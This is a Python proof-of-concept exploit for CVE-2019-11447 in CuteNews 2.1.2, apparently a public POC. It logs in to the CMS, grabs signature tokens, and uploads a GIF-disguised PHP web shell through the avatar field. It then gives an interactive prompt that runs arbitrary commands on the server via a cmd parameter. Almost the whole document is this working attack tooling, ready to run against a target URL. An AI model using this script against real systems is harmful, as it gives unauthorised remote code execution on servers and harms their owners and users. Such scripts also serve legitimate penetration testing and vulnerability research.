import requests
import random
import sys
import re

"""
CVE-2019-11447 - CuteNews 2.1.2

POC by CRFSlick, discovered by AkkuS <Özkan Mustafa Akkuş>

An issue was discovered in CutePHP CuteNews 2.1.2. An attacker can infiltrate the server 
through the avatar upload process in the profile area via the avatar_file field to 
index.php?mod=main&opt=personal. There is no effective control of $imgsize in 
/core/modules/dashboard.php. The header content of a file can be changed and the control 
can be bypassed for code execution. (An attacker can use the GIF header for this.)

https://github.com/CRFSlick/CVE-2019-11447-POC
https://nvd.nist.gov/vuln/detail/CVE-2019-11447
http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html

Usage:
	CVE-2019-11447.py <username> <password> <base uri / login page>

Example:
	CVE-2019-11447.py admin p4ssw0rd http://192.168.1.19/CuteNews/index.php
"""

# All the cool POC's have l33t banners, right??
banner = '-.-. --- --- .-..    .... ....- -..- --- .-.    -... .- -. -. . .-.'

# Globals
try:
	username = sys.argv[1]
	password = sys.argv[2]
	base_uri = sys.argv[3]
except:
	print(f'\nYou supplied {len(sys.argv) - 1} out of 3 required parameters...')
	print('Usage: CVE-2019-1144.py <username> <password> <baseuri>')
	print('Example: CVE-2019-1144.py admin p4ssw0rd http://192.168.1.19/CuteNews/index.php')
	exit()

session = requests.session()
filename = random.randrange(99999)
key_head = 'dGhpc3dlYnNoZWxsb3V0cHV0c3RhcnRzaGVyZQ=='
key_tail = 'dGhpc3dlYnNoZWxsb3V0cHV0ZW5kc2hlcmU='

# Clean up base uri
if '.php' in base_uri:
	base_uri = base_uri[:base_uri.rindex('/')]
base_uri.strip('/')

# Setup proxies if you wana see whats going on :)
proxies = {
	# 'http': 'http://127.0.0.1:8080'
}

def version():
	regex_result = re.findall('.*Powered by .*?>(.*)<\/a> ', session.get(f'{base_uri}/index.php').text)
	if regex_result:
		full_version = regex_result[0]
		version = full_version.split()[-1]
		print(f'[*] Detected version \'{full_version}\'')
		if version != '2.1.2':
			input(f'[-] Version appears to be \'{version}\' which may not be vulnerable, continue anyway? [y=enter]: ')
	else:
		input('[-] Automatic version detection failed, would you like to continue anyway? [y=enter]: ')

def login():
	data = {
		'action': 'dologin',
		'username': username,
		'password': password
	}

	print(f'[*] Grabbing session cookie')
	r = session.get(f'{base_uri}/index.php')

	if 'Please Login' not in r.text:
		print('[x] Invalid baseuri, must be the URL of the CuteNews login page!')
		exit()

	print(f'[*] Logging in as {username}:{password}')
	r = session.post(f'{base_uri}/index.php', data=data)

	if 'Please Login' in r.text:
		print('[x] Invalid Credentials')
		exit()
	else:
		print('[+] Login Success!')

def upload():
	print(f'[*] Grabbing __signature_key and __signature_dsi needed for pofile update request')
	r = session.get(f'{base_uri}/index.php?mod=main&opt=personal')
	regex_result = re.findall('.*name="__signature_key" value="(.*?)".*name="__signature_dsi" value="(.*?)".*', r.text)

	signature_key = regex_result[0][0]
	signature_dsi = regex_result[0][1]

	print(f'[+] __signature_key: {signature_key}')
	print(f'[+] __signature_dsi: {signature_dsi}')

	data = {
		'mod': (None, 'main'),
		'opt': (None, 'personal'),
		'__signature_key': (None, signature_key),
		'__signature_dsi': (None, signature_dsi),
		'editpassword': (None, None),
		'confirmpassword': (None, None),
		'avatar_file': (f'{filename}.php', open('sad.gif', 'rb').read())
	}

	print(f'[*] Uploading evil avatar... ', end='')
	r = session.post(f'{base_uri}/index.php', files=data, proxies=proxies)
	print('Done!')

	if r.status_code != 200:
		print(f'[x] Error uploading file, status code {r.status_code}')
		print(f'[x] Dumping http reseponse')
		print(r.text)
		exit()

	print(f'[*] Validating that the file was uploaded... ', end='')
	r = session.get(f'{base_uri}/uploads/avatar_{username}_{filename}.php')

	if r.status_code != 200:
		print(f'[x] Error uploading file, status code {r.status_code}')
		print(f'[x] Dumping http reseponse')
		print(r.text)
		exit()

	print('Yup!')
	print(f'[+] {base_uri}/uploads/avatar_{username}_{filename}.php?cmd=<cmd>')

def display_cmd(cmd):
	r = session.get(f'{base_uri}/uploads/avatar_{username}_{filename}.php?cmd={cmd}')
	cmd_output = r.text[r.text.find(key_head) + len(key_head):r.text.find(key_tail)].strip()
	if cmd_output == '':
		print('Command returned no output')
	else:
		print(f'{cmd_output}')
	print()

def main():
	print(banner)
	version()
	login()
	upload()
	print('[*] Looks like everything went smoothly, lets see if we have RCE!')
	print('[*] Keep in mind that this shell is limited, no STDERR\n')

	while True:
		print('$> ', end='')
		cmd = input()
		display_cmd(cmd)
		if cmd.lower() == 'exit':
			exit()

main()
